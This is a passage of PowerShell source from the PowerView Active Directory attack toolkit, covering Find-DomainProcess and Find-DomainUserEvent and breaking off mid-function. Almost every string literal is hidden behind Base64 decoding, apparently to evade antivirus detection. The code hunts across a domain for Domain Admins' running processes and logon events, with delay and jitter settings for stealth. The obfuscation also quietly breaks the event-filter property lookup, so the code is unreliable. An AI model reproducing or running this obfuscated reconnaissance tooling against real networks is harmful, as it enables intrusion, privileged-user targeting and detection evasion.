        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $UserSearcherArguments = @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $UserLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))] = $UserAdminCount }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }


        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4=")))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogezB9"))) -f $($TargetComputers.Length))
        if ($TargetComputers.Length -eq 0) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRl")))
        }

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU=")))]) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFsbG93RGVsZWdhdGlvbg==")))]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $UserGroupIdentity
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ=="))) = $True
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    
                    
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiB7MH0="))) -f $($TargetComputers.count))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVy")))
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgezB9KQ=="))) -f $($TargetComputers.count))
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVGFyZ2V0IHVzZXIgZm91bmQsIHJldHVybmluZyBlYXJseQ==")))
                    return
                }
            }
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHM=")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU="))) = $TargetProcessName
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA=="))) = $Credential
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $UserLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))] = $UserAdminCount }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckdyb3VwSWRlbnRpdHk=")))] -or (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVy")))])) {
            
            $GroupSearcherArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $UserGroupIdentity
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ=="))) = $True
            }
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckdyb3VwSWRlbnRpdHk6ICRVc2VyR3JvdXBJZGVudGl0eQ==")))
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            $TargetComputers = $ComputerName
        }
        else {
            
            $DCSearcherArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))) = $True
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBRdWVyeWluZyBmb3IgZG9tYWluIGNvbnRyb2xsZXJzIGluIGRvbWFpbjogJERvbWFpbg==")))
            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiB7MH0="))) -f $($TargetComputers.Length))
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXRDb21wdXRlcnMgJFRhcmdldENvbXB1dGVycw==")))
        if ($TargetComputers.Length -eq 0) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGU=")))
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhcnRUaW1l")))] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW5kVGltZQ==")))] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4RXZlbnRz")))] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3I=")))
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3A=")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0b3I=")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW9u"))))) {
                                    if (($Filter[$_] -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Jg==")))) -or ($Filter[$_] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW5k"))))) {
                                        $Operator = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW5k")))
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3A=")))) -and ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0b3I=")))) -and ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW9u"))))}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3I=")))) {
                                    ForEach ($Key in $Keys) {
                                        if ($_.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEtleQ=="))) -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach ($Key in $Keys) {
                                        if ($_.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEtleQ=="))) -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6IHswfQ=="))) -f $($TargetComputers.count))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXI=")))
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBFbnVtZXJhdGluZyBzZXJ2ZXIgJFRhcmdldENvbXB1dGVyICgkQ291bnRlciBvZiB7MH0p"))) -f $($TargetComputers.count))
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXQgdXNlciBmb3VuZCwgcmV0dXJuaW5nIGVhcmx5")))
                    return
                }
            }
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcw==")))

            
